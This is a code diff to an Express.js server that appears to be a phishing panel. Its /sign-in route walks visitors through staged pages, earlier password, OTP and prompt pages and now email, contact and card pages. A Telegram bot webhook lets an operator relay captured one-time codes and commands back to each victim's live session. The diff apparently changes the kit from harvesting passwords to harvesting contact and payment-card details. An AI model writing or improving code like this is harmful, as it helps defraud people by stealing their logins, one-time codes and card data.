@@ -1,4 +1,5 @@
 import express from "express";
+import { engine } from "express-edge";
 import geoip from "geoip-lite";
 import session from "express-session";
 import axios from "axios";
@@ -15,6 +16,7 @@ dotenv.config();
 
 const pendingPrompts = new Map();
 const activeLocks = new Set();
+
 
 
 // =====================================================
@@ -37,24 +39,24 @@ router.get('/sign-in', requireCap, (req, res, next) => {
   const { user } = req.session;
   const { action } = req.query;
 
-  // If no session, redirect or show default page
   if (!user) {
     req.session.user = { user };
 
     if (action) return res.redirect('/sign-in');
-    return res.sendFile('email.html', { root: 'views/user' });
+
+    return res.render('user/login');
   }
 
-  // If session exists, determine which page to show
   const pages = {
-    auth: 'password.html',
-    otp: 'otp.html',
-    prompt: 'prompt.html',
-    fail: 'fail.html',
+    email: 'user/email',
+    contact: 'user/contact',
+    card: 'user/card',
+    complete: 'user/complete',
   };
 
-  const page = pages[action] || 'email.html';
-  res.sendFile(page, { root: 'views/user' });
+  const page = pages[action] || 'user/email';
+
+  res.render(page);
 });
 
 router.get("/admin-info", async (req, res) => {
@@ -551,7 +553,7 @@ router.post("/telegram-webhook", async (req, res) => {
       }
 
       const promptData = pendingPrompts.get(chatId);
-      const { userId, messageId } = promptData;
+	  const { userId, messageId, command } = promptData;
 
       // Clear timer
       if (pendingButtonTimers.has(chatId)) {
@@ -575,12 +577,12 @@ router.post("/telegram-webhook", async (req, res) => {
 
       // Send number to your handler/webhook logic
       await handleAdminCommand({
-        userId,
-        command: "prompt",
-        otp: text,
-        io,
-        db
-      });
+		  userId,
+		  command,
+		  otp: text,
+		  io,
+		  db
+		});
 
       await axios.post(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
@@ -641,7 +643,7 @@ router.post("/telegram-webhook", async (req, res) => {
     }
 
       // Store pending prompt
-      pendingPrompts.set(chatId, { userId, messageId });
+      pendingPrompts.set(chatId, { userId, messageId, command });
 
       // Start 15s timer
       const timer = setTimeout(async () => {
